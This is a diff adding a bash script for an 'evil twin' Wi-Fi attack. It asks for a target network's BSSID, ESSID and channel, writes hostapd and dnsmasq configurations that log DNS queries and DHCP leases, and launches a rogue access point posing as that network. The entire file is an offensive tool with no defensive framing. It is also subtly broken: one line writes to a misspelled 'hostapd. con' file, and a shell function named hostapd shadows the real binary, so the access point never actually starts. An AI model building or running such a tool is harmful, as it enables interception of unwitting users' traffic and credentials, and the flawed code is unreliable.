@@ -1,0 +1,54 @@
+#!/bin/bash
+rm -r /wl-twin/log/mac.txt > /dev/null 2>&1
+rm -r /wl-twin/log/hostapd.conf > /dev/null 2>&1
+rm -r /wl-twin/log/dnsmasq.conf > /dev/null 2>&1
+
+#create hostapd.conf 
+function hostapd(){
+echo "interface=wlan1" >> /wl-twin/log/hostapd.conf
+echo "driver=nl80211" >> /wl-twin/log/hostapd. con
+echo "ssid=$ssid" >> /wl-twin/log/hostapd.conf
+echo "channel=$c" >> /wl-twin/log/hostapd.conf
+} 
+
+#create dns
+function dns(){
+echo "interface=wlan1" >> /wl-twin/log/dnsmasq.conf
+echo "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h" >> /wl-twin/log/dnsmasq.conf
+echo "dhcp-option=3,192.168.1.1" >> /wl-twin/log/dnsmasq.conf
+echo "dhcp-option=6,192.168.1.1" >> /wl-twin/log/dnsmasq.conf
+echo "server=8.8.8.8" >> /wl-twin/log/dnsmasq.conf
+echo "log-queries" >> /wl-twin/log/dnsmasq.conf
+echo "log-dhcp" >> /wl-twin/log/dnsmasq.conf
+echo "listen-address=127.0.0.1" >> /wl-twin/log/dnsmasq.conf
+} 
+
+#fakeAp
+function fakeAp(){
+echo "Choose Target "
+read -p "BSSID   [*]Example 00:A9:5B:xx:xx:xx: " bsid;
+read -p "ESSID   [*]Example EvilFakeAp: " ssid;
+read -p "Channel [*]Example 11: " c;
+echo
+echo "bssid    :$bsid"
+echo "essid    :$ssid"
+echo "Channel  :$c"
+echo $bsid >> /wl-twin/log/mac.txt
+
+dns
+sleep 2
+hostapd
+sleep 2
+
+echo "Create Fake App"
+sleep 1
+hostapd /wl-twin/log/hostapd.conf
+}
+
+airodump-ng wlan1
+wlan1=$?
+ if [ $wlan1 != 0 ]; then
+   echo "[!] No Wireles Card"
+   exit $wlan1
+ fi
+fakeAp
